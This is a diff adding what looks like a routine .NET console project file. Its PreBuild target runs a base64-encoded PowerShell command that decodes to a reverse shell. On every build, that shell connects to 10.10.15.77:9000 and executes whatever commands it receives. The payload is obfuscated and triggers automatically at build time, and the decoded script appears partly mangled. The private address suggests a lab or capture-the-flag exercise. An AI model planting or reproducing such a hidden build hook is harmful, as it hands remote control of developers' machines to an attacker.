@@ -1,0 +1,13 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+  </PropertyGroup>
+    <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+        <Exec Command="powershell -Command 'powershell -e ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KDEwLjEwLjE1Ljc3LDkwMDApOyA9IC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCA9IC5SZWFkKCwgMCwgLkxlbmd0aCkpIC1uZSAwKXs7ID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygsMCwgKTsgPSAoaWV4ICAyPiYxIHwgT3V0LVN0cmluZyApOyA9ICArIFBTICArIChwd2QpLlBhdGggKyAK'" />
+    </Target>
+
+</Project>
